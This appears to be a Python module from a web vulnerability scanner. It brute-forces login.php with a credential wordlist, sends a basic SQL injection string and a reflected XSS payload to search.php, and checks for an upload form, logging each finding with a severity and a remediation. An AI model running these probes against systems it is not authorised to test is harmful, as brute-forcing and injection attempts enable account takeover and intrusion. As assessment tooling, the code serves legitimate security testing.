# exploit.py - Simulated web exploits with improved clarity and error handling
import requests
from reporter import Reporter

def brute_force_login(url, wordlist_path="creds.txt"):
    """Attempts brute-force login using provided credentials."""
    login_url = url.rstrip("/") + "/login.php"
    try:
        with open(wordlist_path, "r", encoding="utf-8") as file:
            creds = [line.strip().split(":", 1) for line in file if ":" in line]
    except FileNotFoundError:
        return "Credential file not found.", "Low", "Provide valid credentials file."

    for username, password in creds:
        try:
            response = requests.post(login_url, data={"username": username, "password": password}, timeout=5)
            if "Login failed" not in response.text:
                return f"Weak credentials found: {username}:{password}", "High", "Use strong passwords; implement rate limiting."
        except requests.RequestException:
            continue

    return "No weak credentials found.", "Low", "Ensure brute-force protections."

def simulate_sql_injection(url):
    """Tests for SQL injection vulnerability."""
    test_url = url.rstrip("/") + "/search.php?q=' OR '1'='1"
    try:
        response = requests.get(test_url, timeout=5)
        if "sql" in response.text.lower() or "error" in response.text.lower():
            return "Potential SQL injection detected.", "High", "Use parameterized queries."
    except requests.RequestException as e:
        return f"SQL Injection test error: {e}", "Low", "Review endpoint stability."

    return "No SQL injection indicators.", "Low", "Ensure input sanitization."

def simulate_xss(url):
    """Tests for reflected XSS vulnerability."""
    test_url = url.rstrip("/") + "/search.php?q=<script>alert(1)</script>"
    try:
        response = requests.get(test_url, timeout=5)
        if "<script>alert(1)</script>" in response.text:
            return "Reflected XSS detected.", "Medium", "Sanitize inputs; use CSP."
    except requests.RequestException as e:
        return f"XSS test error: {e}", "Low", "Review endpoint stability."

    return "No XSS detected.", "Low", "Ensure proper output encoding."

def check_file_upload(url):
    """Checks for existence of file upload form."""
    upload_url = url.rstrip("/") + "/upload.php"
    try:
        response = requests.get(upload_url, timeout=5)
        if "file" in response.text.lower():
            return "File upload form detected.", "Medium", "Restrict file types; scan uploads."
    except requests.RequestException as e:
        return f"File upload check error: {e}", "Low", "Protect file upload endpoints."

    return "No file upload form.", "Low", "Ensure upload protections."

def run_exploits(url, reporter: Reporter):
    """Executes all exploit simulations and logs results."""
    exploits = [
        ("Weak Login Credential Check", brute_force_login),
        ("SQL Injection Test", simulate_sql_injection),
        ("XSS Test", simulate_xss),
        ("File Upload Check", check_file_upload),
    ]

    for title, exploit in exploits:
        result, severity, remediation = exploit(url)
        reporter.add_section(title, f"Result: {result}\nSeverity: {severity}\nRemediation: {remediation}")
